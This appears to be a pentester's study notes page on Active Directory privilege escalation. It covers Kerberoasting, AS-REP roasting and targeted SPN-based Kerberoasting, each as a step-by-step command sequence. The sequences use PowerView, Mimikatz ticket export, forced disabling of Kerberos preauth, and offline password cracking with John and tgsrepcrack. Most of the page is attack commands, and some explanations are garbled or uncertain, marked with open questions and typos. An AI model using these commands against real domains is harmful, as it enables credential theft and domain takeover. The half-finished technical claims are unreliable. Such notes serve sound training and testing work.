# AD - Privilege Escalation

## 🍳Kerberoast

### Description

* Offline cracking of service account password
* The Kerberos session ticket (TGS) has a server portion which is encrypted with the password hash/NTLM hash of the service account - this makes it possible to request a ticket and do offline cracking
* Service accounts are many times ignored (less pw changes) and have privileged access
* Password hashes of services accounts could be used to create silver tickets
* In the logs will only be a Kerberos Ticket Requested entry on the dc
* If an account has the property ServicePrincipalName set to not 'null', the KDC assumes that it is a service account
* Abuse Step 3 and 4 - when we get it afte step 4 we can brute force it
* ❓If you run a service as a domain admin, all the protections like protected users groups, credential manager etc. because for a service account the sercrets are stored in lsssecret and not in lsass

{% hint style="info" %}
Only target user service accounts and not machine accounts.

Machine accounts wont work, because they create 100 characters and rotate it every 30 days.
{% endhint %}



### Requirement

* No privs needed
* ❓TGT needed?

### Tool

**1.Find user accounts used as service accounts:**\
PowerView: Get-NetUser -SPN\
\
ADModule:\
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -properties ServicePrincipalName

**2. Request a TGS for the SPN**\
Add-Type -AssemblyName System.IdentityModel\
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "SPN Name from command before"

Request-SPNTicket from PowerView can be used for cracking with John or Hashcat

**3. Check if TGS in memory & save it to disk**\
klist\
Invoke-Mimikatz -Command '"kerberos::list /export"'

**4. Crack it with John/Hashcat/tsrepcrack**\
python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\filenameOfMimikatzExport



## 🎯🍳Targeted Kerberoasting - AS-REPs

### Description

* If UserAccountControl setting/flag does have "Do not require Kerberos preauthentication" enabled. It is therefore possible to grab users crackable AS-REP and bruteforce offline
* WIth sufficient rights like GenericWrite and Generic All, Kerberos preauth can be forced disabled as well
* It does not matter if the Service is still running or if the SPN makes sense at all
* The "pre-auth" part is Step 1 in the Diagram. Because the timestamp is encrypted with users NTLM hash, the KDC knows the request came from the user.
  * If "Do not require Kerberos preauthentication" is enabled, every user can send that request
  * In Step 2 we get the response - a part of it is encrypted using the users hash! What part? i ❓ thought it is just krbtgt?
* Abuse Step 1 and 2

### Requirement

### Tool

**1.Enumerate accounts with Kerberos Preauth disabled**\
****PowerView dev: Get-DomainUser -PreauthNotRequired -verbose

AD Module: Get-ADUser -filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth

**1.OR - Force disable Kerberos PreAuth if we have enough privs GenericWrite and Generic All on user Accounts**

**Enum permissions  for RDPUsers on ACL using PowerView Dev:**\
****Invoke-ACLScanner -ResolveGUIDs | ?{$\_.IdentityReferenceName -match "RDPUsers"}\
Set-DomainObject -Identity user1 -xor @{useraccountcontrol=4194304} -verbose\
Get-DomainUser -PreauthNotRequired -verbose

**2. Request encrypted AS-REP for offline cracking**\
****Get-ASREPHash -Username user1 -verbose

**❗Enumerate all users with Kerberos preauth disalbed and request a hash**\
****Invoke-ASREPRoast -verbose

Crack it\
cd JohnTheRipper-bleeding-jmbo\
./john user1 --wordlist=wordlist.txt

## 🎯🍳Targeted Kerberoasting - SetSPN

### Description

* With enought privs (GenericAll, GenericWrite) the SPN of a target User can be sot to anything
* We can request a TGS without special privs. The TGS can be kerberoasted

### Requirement

* None

### Tool

**1.Enum possible Users**\
Invoke-ACLScanner -ResolveGUIDs | ?{$\_.IdentityReferenceName -match "RDPUsers"}

**2.Usinger PowerView dev, see if user alread has an SPN set**\
Get-DomainUser -Identity user1 | select servieprincipalname

Using AD Module:\
Get-ADUser -Identity user1 -properties ServicePrincipalName | select ServicePrincipalName

**3. If not, set an SPN (must be unique for the domain) - PowerView dev**\
****Set-DomainObject -Identity user1 -Set @serviceprincipalname='what/ever'}\
\
Using AD Module\
Set-ADuser -identity user1 -serviceprincipalname @{Add='nameyour/spn'}

**4. Request a TGS for the SPN**\
Add-Type -AssemblyName System.IdentityModel\
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "nameyour/spn"

**3. Check if TGS in memory & save it to disk**\
klist\
Invoke-Mimikatz -Command '"kerberos::list /export"'

**4. Crack it with John/Hashcat/tsrepcrack**\
python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\filenameOfMimikatzExport

